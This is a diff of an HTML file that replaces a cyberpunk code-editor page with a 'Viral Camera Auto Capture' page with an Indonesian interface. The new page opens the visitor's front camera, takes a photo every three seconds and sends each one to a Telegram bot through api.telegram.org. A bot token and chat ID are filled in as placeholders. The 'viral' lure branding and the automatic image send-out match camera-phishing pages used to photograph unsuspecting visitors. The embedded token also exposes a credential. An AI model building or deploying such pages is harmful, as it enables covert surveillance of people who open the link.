@@ -3,597 +3,404 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CybX0RCode - Advanced Cyberpunk Editor</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+    <title>Viral Camera Capture</title>
     <style>
         :root {
-            --neon-blue: #0ff0fc;
             --neon-pink: #ff2a6d;
-            --neon-purple: #d300c5;
+            --neon-blue: #0ff0fc;
             --dark-bg: #0a0a12;
-            --panel-bg: #161622;
-            --text-color: #e0e0e0;
-            --accent: #7b2dff;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Courier New', monospace;
         }
         
         body {
+            font-family: 'Arial', sans-serif;
             background-color: var(--dark-bg);
-            color: var(--text-color);
-            overflow: hidden;
-            height: 100vh;
-        }
-        
-        /* Loading Animation */
-        .loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: var(--dark-bg);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            transition: opacity 0.5s ease-out;
-        }
-        
-        .cyber-loader {
-            width: 80px;
-            height: 80px;
-            border: 5px solid var(--neon-blue);
-            border-radius: 50%;
-            border-top-color: transparent;
-            animation: spin 1s linear infinite;
-        }
-        
-        @keyframes spin {
-            100% { transform: rotate(360deg); }
-        }
-        
-        .loading-text {
-            margin-top: 20px;
-            font-size: 18px;
-            color: var(--neon-blue);
-            text-shadow: 0 0 8px var(--neon-blue);
-        }
-        
-        /* Main Editor */
-        .editor-container {
-            display: none;
-            grid-template-columns: 1fr 1fr;
-            height: 100vh;
-            gap: 10px;
-            padding: 10px;
-        }
-        
-        .editor-panel, .preview-panel {
-            background-color: var(--panel-bg);
-            border-radius: 12px;
-            padding: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            display: flex;
-            flex-direction: column;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .editor-panel::before, .preview-panel::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: linear-gradient(90deg, var(--neon-pink), var(--neon-blue));
-        }
-        
-        .panel-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .panel-title {
-            font-size: 18px;
-            font-weight: 600;
-            color: var(--neon-blue);
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .tabs {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 10px;
-            overflow-x: auto;
-            padding-bottom: 5px;
-        }
-        
-        .tab {
-            padding: 8px 15px;
-            background-color: rgba(255, 255, 255, 0.05);
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 14px;
-            transition: all 0.3s;
-            white-space: nowrap;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .tab.active {
-            background-color: var(--neon-purple);
             color: white;
-            border-color: var(--neon-purple);
+            margin: 0;
+            padding: 20px;
+            text-align: center;
         }
         
-        .editor-area {
-            flex-grow: 1;
-            background-color: #1e1e2e;
-            border-radius: 8px;
-            overflow: hidden;
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: rgba(22, 22, 34, 0.8);
+            border-radius: 15px;
+            box-shadow: 0 0 20px var(--neon-pink);
+            border: 2px solid var(--neon-blue);
+        }
+        
+        h1 {
+            color: var(--neon-blue);
+            text-shadow: 0 0 10px var(--neon-blue);
+            margin-bottom: 30px;
+        }
+        
+        .camera-container {
             position: relative;
-        }
-        
-        .editor-textarea {
             width: 100%;
-            height: 100%;
-            background: transparent;
-            border: none;
-            color: var(--text-color);
-            padding: 15px;
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 14px;
-            line-height: 1.5;
-            resize: none;
-            outline: none;
+            max-width: 640px;
+            margin: 0 auto 20px;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 0 15px var(--neon-pink);
         }
         
-        .preview-frame {
-            flex-grow: 1;
-            background-color: #1e1e2e;
-            border-radius: 8px;
-            overflow: auto;
-        }
-        
-        .preview-frame iframe {
+        #video {
             width: 100%;
-            height: 100%;
-            border: none;
-            background-color: white;
-            border-radius: 4px;
+            display: block;
+            transform: scaleX(-1); /* Mirror effect */
         }
         
-        .language-selector {
-            background-color: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            color: var(--text-color);
-            padding: 5px 10px;
-            border-radius: 4px;
-            outline: none;
-            cursor: pointer;
+        #canvas {
+            display: none;
         }
         
         .controls {
-            display: flex;
-            gap: 10px;
-            margin-top: 15px;
+            margin: 20px 0;
         }
         
-        .btn {
-            padding: 8px 15px;
-            border-radius: 6px;
+        button {
+            background: linear-gradient(45deg, var(--neon-pink), var(--neon-blue));
             border: none;
+            color: white;
+            padding: 12px 25px;
+            font-size: 16px;
+            border-radius: 50px;
             cursor: pointer;
-            font-weight: 500;
+            margin: 10px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
             transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 6px;
+            box-shadow: 0 5px 15px rgba(0, 247, 255, 0.4);
         }
         
-        .btn-run {
-            background-color: var(--neon-blue);
-            color: #111;
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 42, 109, 0.6);
         }
         
-        .btn-save {
-            background-color: var(--neon-purple);
-            color: white;
+        button:disabled {
+            background: #666;
+            cursor: not-allowed;
         }
         
-        .btn-new {
-            background-color: var(--neon-pink);
-            color: white;
-        }
-        
-        .btn-upload {
-            background-color: #7b2dff;
-            color: white;
-        }
-        
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 247, 255, 0.3);
-        }
-        
-        .status-bar {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 10px;
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.6);
-        }
-        
-        .file-input {
-            display: none;
-        }
-        
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            z-index: 10000;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .modal-content {
-            background-color: var(--panel-bg);
-            padding: 20px;
-            border-radius: 8px;
-            width: 400px;
-            max-width: 90%;
-            border: 1px solid var(--neon-blue);
-        }
-        
-        .modal-title {
-            color: var(--neon-blue);
-            margin-bottom: 15px;
-        }
-        
-        .modal-input {
-            width: 100%;
+        .status {
+            margin-top: 20px;
             padding: 10px;
-            margin-bottom: 15px;
-            background-color: rgba(255, 255, 255, 0.1);
-            border: 1px solid var(--neon-blue);
-            color: white;
-            border-radius: 4px;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.1);
         }
         
-        .modal-buttons {
+        .gallery {
             display: flex;
-            justify-content: flex-end;
+            flex-wrap: wrap;
+            justify-content: center;
             gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .gallery img {
+            width: 100px;
+            height: 100px;
+            object-fit: cover;
+            border-radius: 5px;
+            border: 2px solid var(--neon-blue);
+            transition: transform 0.3s;
+        }
+        
+        .gallery img:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 10px var(--neon-pink);
+        }
+        
+        .viral-sticker {
+            position: absolute;
+            width: 100px;
+            right: 20px;
+            top: 20px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .telegram-info {
+            background: rgba(0, 136, 204, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            border-left: 4px solid #0088cc;
+        }
+        
+        input {
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid var(--neon-blue);
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            margin: 10px 0;
+            width: 80%;
+            max-width: 400px;
         }
     </style>
 </head>
 <body>
-    <!-- Loading Screen -->
-    <div class="loading-screen" id="loadingScreen">
-        <div class="cyber-loader"></div>
-        <div class="loading-text">CYBX0RCODE INITIALIZING</div>
-    </div>
-    
-    <!-- New File Modal -->
-    <div class="modal" id="newFileModal">
-        <div class="modal-content">
-            <h3 class="modal-title">CREATE NEW FILE</h3>
-            <input type="text" class="modal-input" id="newFileName" placeholder="filename.html">
-            <select class="modal-input" id="newFileType">
-                <option value="html">HTML</option>
-                <option value="css">CSS</option>
-                <option value="js">JavaScript</option>
-                <option value="php">PHP</option>
-                <option value="py">Python</option>
-            </select>
-            <div class="modal-buttons">
-                <button class="btn" id="cancelNewFile">CANCEL</button>
-                <button class="btn btn-run" id="confirmNewFile">CREATE</button>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Main Editor -->
-    <div class="editor-container" id="editorContainer">
-        <div class="editor-panel">
-            <div class="panel-header">
-                <div class="panel-title">
-                    <span>✧ Editor</span>
-                </div>
-                <select class="language-selector" id="languageSelector">
-                    <option value="html">HTML</option>
-                    <option value="css">CSS</option>
-                    <option value="javascript">JavaScript</option>
-                    <option value="php">PHP</option>
-                    <option value="python">Python</option>
-                </select>
-            </div>
-            
-            <div class="tabs" id="fileTabs">
-                <div class="tab active" data-file="index.html">index.html</div>
-                <div class="tab" data-file="style.css">style.css</div>
-                <div class="tab" data-file="script.js">script.js</div>
-                <div class="tab" id="addTabBtn">+</div>
-            </div>
-            
-            <div class="editor-area">
-                <textarea id="codeEditor" class="editor-textarea" spellcheck="false">&lt;!DOCTYPE html&gt;
-&lt;html lang="en"&gt;
-&lt;head&gt;
-    &lt;meta charset="UTF-8"&gt;
-    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
-    &lt;title&gt;CybX0RCode Project&lt;/title&gt;
-    &lt;link rel="stylesheet" href="style.css"&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;h1&gt;Welcome to CybX0RCode&lt;/h1&gt;
-    &lt;p&gt;Your cyberpunk coding environment&lt;/p&gt;
-    
-    &lt;script src="script.js"&gt;&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;</textarea>
-                <pre><code class="hljs" id="highlightedCode"></code></pre>
-            </div>
-            
-            <div class="controls">
-                <button class="btn btn-run" id="runBtn">
-                    <span>▶</span>
-                    <span>RUN</span>
-                </button>
-                <button class="btn btn-save" id="saveBtn">
-                    <span>⏣</span>
-                    <span>SAVE</span>
-                </button>
-                <button class="btn btn-new" id="newBtn">
-                    <span>+</span>
-                    <span>NEW</span>
-                </button>
-                <button class="btn btn-upload" id="uploadBtn">
-                    <span>↑</span>
-                    <span>UPLOAD</span>
-                </button>
-                <input type="file" id="fileUpload" class="file-input" multiple>
-            </div>
-            
-            <div class="status-bar">
-                <div id="fileInfo">HTML | UTF-8</div>
-                <div id="cursorPosition">Ln 1, Col 1</div>
-            </div>
+    <div class="container">
+        <img src="https://i.ibb.co/0jQ7Z0T/viral.png" alt="VIRAL" class="viral-sticker">
+        <h1>VIRAL CAMERA AUTO CAPTURE</h1>
+        
+        <div class="telegram-info">
+            <h3>Telegram Bot Settings</h3>
+            <input type="text" id="botToken" placeholder="8299240007:AAHN7OTPC4cjG17_66bmOhl-oBwbAthyk0c">
+            <input type="text" id="chatId" placeholder="7548339932">
+            <p>Dapatkan Bot Token dari @BotFather dan Chat ID dari @userinfobot di Telegram</p>
         </div>
         
-        <div class="preview-panel">
-            <div class="panel-header">
-                <div class="panel-title">
-                    <span>◈ Preview</span>
-                </div>
-                <div class="panel-title">
-                    <span>⟳</span>
-                    <span>Auto-refresh</span>
-                </div>
-            </div>
-            
-            <div class="preview-frame">
-                <iframe id="previewFrame" sandbox="allow-scripts allow-same-origin"></iframe>
-            </div>
-            
-            <div class="status-bar">
-                <div>http://cybx0rcode.local</div>
-                <div>200 OK</div>
-            </div>
+        <div class="camera-container">
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas"></canvas>
+        </div>
+        
+        <div class="controls">
+            <button id="startBtn">Start Auto Capture</button>
+            <button id="stopBtn" disabled>Stop Capture</button>
+            <button id="testBtn">Test Send to Telegram</button>
+        </div>
+        
+        <div class="status" id="status">
+            Status: Menunggu untuk memulai...
+        </div>
+        
+        <div class="gallery" id="gallery">
+            <!-- Captured images will appear here -->
         </div>
     </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/languages/javascript.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/languages/css.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/languages/python.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/languages/php.min.js"></script>
     <script>
-        // Initialize highlight.js
-        hljs.highlightAll();
+        // DOM Elements
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const testBtn = document.getElementById('testBtn');
+        const statusDiv = document.getElementById('status');
+        const galleryDiv = document.getElementById('gallery');
+        const botTokenInput = document.getElementById('botToken');
+        const chatIdInput = document.getElementById('chatId');
         
-        // Project state
-        const projectState = {
-            files: {
-                'index.html': {
-                    content: `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CybX0RCode Project</title>
-    <link rel="stylesheet" href="style.css">
-</head>
-<body>
-    <h1>Welcome to CybX0RCode</h1>
-    <p>Your cyberpunk coding environment</p>
-    
-    <script src="script.js"></script>
-</body>
-</html>`,
-                    language: 'html'
-                },
-                'style.css': {
-                    content: `body {
-    font-family: 'Courier New', monospace;
-    background-color: #0a0a12;
-    color: #0ff0fc;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-    overflow: hidden;
-}
-
-h1 {
-    text-shadow: 0 0 10px #0ff0fc;
-    text-transform: uppercase;
-    letter-spacing: 3px;
-}`,
-                    language: 'css'
-                },
-                'script.js': {
-                    content: `// Welcome to CybX0RCode
-console.log('Cyberpunk coding initiated');
-
-document.addEventListener('DOMContentLoaded', function() {
-    console.log('System ready');
-});`,
-                    language: 'javascript'
-                }
-            },
-            currentFile: 'index.html'
-        };
-
-        // DOM elements
-        const loadingScreen = document.getElementById('loadingScreen');
-        const editorContainer = document.getElementById('editorContainer');
-        const codeEditor = document.getElementById('codeEditor');
-        const highlightedCode = document.getElementById('highlightedCode');
-        const previewFrame = document.getElementById('previewFrame');
-        const runBtn = document.getElementById('runBtn');
-        const saveBtn = document.getElementById('saveBtn');
-        const newBtn = document.getElementById('newBtn');
-        const uploadBtn = document.getElementById('uploadBtn');
-        const fileUpload = document.getElementById('fileUpload');
-        const fileTabs = document.getElementById('fileTabs');
-        const languageSelector = document.getElementById('languageSelector');
-        const fileInfo = document.getElementById('fileInfo');
-        const cursorPosition = document.getElementById('cursorPosition');
-        const newFileModal = document.getElementById('newFileModal');
-        const newFileName = document.getElementById('newFileName');
-        const newFileType = document.getElementById('newFileType');
-        const confirmNewFile = document.getElementById('confirmNewFile');
-        const cancelNewFile = document.getElementById('cancelNewFile');
-
-        // Initialize the editor
-        function initEditor() {
-            // Load saved project from localStorage
-            const savedProject = localStorage.getItem('cybx0rcode_project');
-            if (savedProject) {
-                try {
-                    const parsed = JSON.parse(savedProject);
-                    projectState.files = parsed.files;
-                    projectState.currentFile = parsed.currentFile || 'index.html';
-                } catch (e) {
-                    console.error('Failed to parse saved project', e);
-                }
-            }
-
-            // Set up the current file
-            updateCurrentFile(projectState.currentFile);
-            renderTabs();
-            
-            // Initialize preview
-            updatePreview();
-        }
-
-        // Update current file in editor
-        function updateCurrentFile(filename) {
-            if (!projectState.files[filename]) {
-                // Create new file if it doesn't exist
-                const extension = filename.split('.').pop();
-                let defaultContent = '';
-                let language = 'plaintext';
+        // Variables
+        let stream = null;
+        let captureInterval = null;
+        const capturedImages = [];
+        
+        // Start camera and auto capture
+        startBtn.addEventListener('click', async () => {
+            try {
+                statusDiv.textContent = "Status: Mengakses kamera...";
                 
-                switch(extension) {
-                    case 'html':
-                        defaultContent = `<!DOCTYPE html>\n<html>\n<head>\n\t<title>New File</title>\n</head>\n<body>\n\n</body>\n</html>`;
-                        language = 'html';
-                        break;
-                    case 'css':
-                        defaultContent = `/* New CSS File */\nbody {\n\t\n}`;
-                        language = 'css';
-                        break;
-                    case 'js':
-                        defaultContent = `// New JavaScript File\nconsole.log('Hello from CybX0RCode');`;
-                        language = 'javascript';
-                        break;
-                    case 'php':
-                        defaultContent = `<?php\n// New PHP File\necho "Hello World!";\n?>`;
-                        language = 'php';
-                        break;
-                    case 'py':
-                        defaultContent = `# New Python File\nprint("Hello World!")`;
-                        language = 'python';
-                        break;
-                }
-                
-                projectState.files[filename] = {
-                    content: defaultContent,
-                    language: language
-                };
-            }
-            
-            projectState.currentFile = filename;
-            codeEditor.value = projectState.files[filename].content;
-            
-            // Update language selector
-            languageSelector.value = projectState.files[filename].language;
-            
-            // Update file info
-            fileInfo.textContent = `${filename.split('.').pop().toUpperCase()} | UTF-8`;
-            
-            // Highlight syntax
-            updateSyntaxHighlighting();
-        }
-
-        // Render file tabs
-        function renderTabs() {
-            fileTabs.innerHTML = '';
-            
-            Object.keys(projectState.files).forEach(filename => {
-                const tab = document.createElement('div');
-                tab.className = `tab ${filename === projectState.currentFile ? 'active' : ''}`;
-                tab.textContent = filename;
-                tab.dataset.file = filename;
-                
-                tab.addEventListener('click', () => {
-                    // Save current file before switching
-                    projectState.files[projectState.currentFile].content = codeEditor.value;
-                    
-                    // Switch to new file
-                    updateCurrentFile(filename);
-                    
-                    // Update active tab
-                    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-                    tab.classList.add('active');
+                // Get camera access
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: 640, 
+                        height: 480,
+                        facingMode: 'user' // Front camera
+                    }, 
+                    audio: false 
                 });
                 
-                fileTabs.appendChild(tab);
-            });
+                video.srcObject = stream;
+                
+                // Enable/disable buttons
+                startBtn.disabled = true;
+                stopBtn.disabled = false;
+                
+                statusDiv.textContent = "Status: Kamera aktif - Auto capture dimulai (setiap 3 detik)";
+                
+                // Start auto capture every 3 seconds
+                captureInterval = setInterval(captureAndSend, 3000);
+                
+                // Capture immediately
+                setTimeout(captureAndSend, 1000);
+                
+            } catch (err) {
+                statusDiv.textContent = "Error: " + err.message;
+                console.error("Camera error:", err);
+            }
+        });
+        
+        // Stop capture
+        stopBtn.addEventListener('click', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
             
-            // Add "+" tab
-            const addTab = document.createElement('div');
-            addTab.className = 'tab';
-            addTab.id = 'addTabBtn';
-            addTab.textContent = '+';
-            addTab.addEventListener('click', () => {
-                newFileModal.style.display = 'flex';
-                newFileName.focus();
-            });
-            fileTabs.appendChild(addTab);
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            
+            statusDiv.textContent = "Status: Capture dihentikan";
+        });
+        
+        // Test send to Telegram
+        testBtn.addEventListener('click', async () => {
+            if (!botTokenInput.value || !chatIdInput.value) {
+                statusDiv.textContent = "Error: Masukkan Bot Token dan Chat ID terlebih dahulu";
+                return;
+            }
+            
+            statusDiv.textContent = "Status: Mengirim test capture ke Telegram...";
+            
+            try {
+                // Create a test image
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to blob
+                canvas.toBlob(async (blob) => {
+                    const success = await sendToTelegram(blob, "Test Capture dari Viral Camera");
+                    if (success) {
+                        statusDiv.textContent = "Status: Test capture berhasil dikirim ke Telegram!";
+                    } else {
+                        statusDiv.textContent = "Error: Gagal mengirim test capture";
+                    }
+                }, 'image/jpeg', 0.8);
+                
+            } catch (err) {
+                statusDiv.textContent = "Error: " + err.message;
+                console.error("Test capture error:", err);
+            }
+        });
+        
+        // Capture and send function
+        async function captureAndSend() {
+            if (!stream) return;
+            
+            try {
+                // Set canvas size
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // Draw video frame to canvas
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Get current timestamp
+                const timestamp = new Date().toLocaleString();
+                
+                // Convert to blob
+                canvas.toBlob(async (blob) => {
+                    // Add to gallery
+                    const imageUrl = URL.createObjectURL(blob);
+                    addToGallery(imageUrl, timestamp);
+                    
+                    // Send to Telegram if credentials are set
+                    if (botTokenInput.value && chatIdInput.value) {
+                        statusDiv.textContent = "Status: Mengirim capture ke Telegram...";
+                        const success = await sendToTelegram(blob, `Auto Capture - ${timestamp}`);
+                        
+                        if (success) {
+                            statusDiv.textContent = `Status: Capture terkirim ke Telegram pada ${timestamp}`;
+                        } else {
+                            statusDiv.textContent = "Error: Gagal mengirim ke Telegram";
+                        }
+                    } else {
+                        statusDiv.textContent = `Status: Capture diambil pada ${timestamp} (Telegram tidak dikonfigurasi)`;
+                    }
+                }, 'image/jpeg', 0.8);
+                
+            } catch (err) {
+                statusDiv.textContent = "Error saat capture: " + err.message;
+                console.error("Capture error:", err);
+            }
         }
-
-        // Update syntax highlighting
-        function updateSyn
+        
+        // Send image to Telegram
+        async function sendToTelegram(blob, caption) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', chatIdInput.value);
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', caption);
+                
+                const response = await fetch(
+                    `https://api.telegram.org/bot${botTokenInput.value}/sendPhoto`,
+                    {
+                        method: 'POST',
+                        body: formData
+                    }
+                );
+                
+                const data = await response.json();
+                return data.ok;
+            } catch (err) {
+                console.error("Telegram send error:", err);
+                return false;
+            }
+        }
+        
+        // Add captured image to gallery
+        function addToGallery(imageUrl, timestamp) {
+            const img = document.createElement('img');
+            img.src = imageUrl;
+            img.title = timestamp;
+            
+            const container = document.createElement('div');
+            container.style.position = 'relative';
+            
+            const timeLabel = document.createElement('div');
+            timeLabel.textContent = timestamp;
+            timeLabel.style.position = 'absolute';
+            timeLabel.style.bottom = '0';
+            timeLabel.style.background = 'rgba(0,0,0,0.7)';
+            timeLabel.style.width = '100%';
+            timeLabel.style.fontSize = '10px';
+            timeLabel.style.padding = '2px';
+            
+            container.appendChild(img);
+            container.appendChild(timeLabel);
+            
+            galleryDiv.insertBefore(container, galleryDiv.firstChild);
+            
+            // Keep only last 12 images
+            if (galleryDiv.children.length > 12) {
+                galleryDiv.removeChild(galleryDiv.lastChild);
+            }
+        }
+        
+        // Load saved Telegram settings from localStorage
+        function loadSettings() {
+            const savedToken = localStorage.getItem('telegram_bot_token');
+            const savedChatId = localStorage.getItem('telegram_chat_id');
+            
+            if (savedToken) botTokenInput.value = savedToken;
+            if (savedChatId) chatIdInput.value = savedChatId;
+        }
+        
+        // Save Telegram settings to localStorage
+        function saveSettings() {
+            localStorage.setItem('telegram_bot_token', botTokenInput.value);
+            localStorage.setItem('telegram_chat_id', chatIdInput.value);
+        }
+        
+        // Save settings when inputs change
+        botTokenInput.addEventListener('change', saveSettings);
+        chatIdInput.addEventListener('change', saveSettings);
+        
+        // Initialize
+        loadSettings();
+        statusDiv.textContent = "Status: Klik 'Start Auto Capture' untuk memulai";
+    </script>
+</body>
+</html>
